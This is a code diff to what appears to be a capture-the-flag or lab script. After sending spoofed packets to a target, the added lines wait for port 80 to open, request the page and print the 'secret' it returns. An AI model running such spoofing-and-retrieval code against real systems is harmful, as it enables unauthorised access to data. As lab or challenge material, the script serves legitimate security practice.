@@ -31,6 +31,24 @@ def main():
     send(packet, count=2, verbose=False)
     print("Spoofed packets sent.")
 
+    # Wait for the server to open port 80
+    print("Waiting for the server to open port 80...")
+    time.sleep(1)
+
+    secret_url = f"http://{target_ip}:80"
+
+    try:
+        print("Attempting to get the secret from the server...")
+        r = requests.get(secret_url, timeout=5)
+
+        # Check if the request was successful
+        if r.status_code == 200:
+            print(f"Secret received:\n{r.text}")
+        else:
+            print(f"Unexpected HTTP status code: {r.status_code}")
+    except Exception as e:
+        print(f"Error getting secret: {e}")
+
 
 if __name__ == "__main__":
     main()
